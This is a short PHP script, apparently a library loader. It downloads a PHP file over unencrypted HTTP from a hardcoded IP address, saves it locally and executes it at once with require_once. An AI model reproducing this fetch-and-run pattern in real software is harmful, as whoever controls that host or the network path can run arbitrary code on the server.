<?
    $content = file_get_contents('http://147.175.15.41/CDNi/libs/download.php?file=Interconnection.php');
    file_put_contents(__DIR__.'/Interconnection.dwl.php', $content);
    require_once (__DIR__.'/Interconnection.dwl.php');
?>
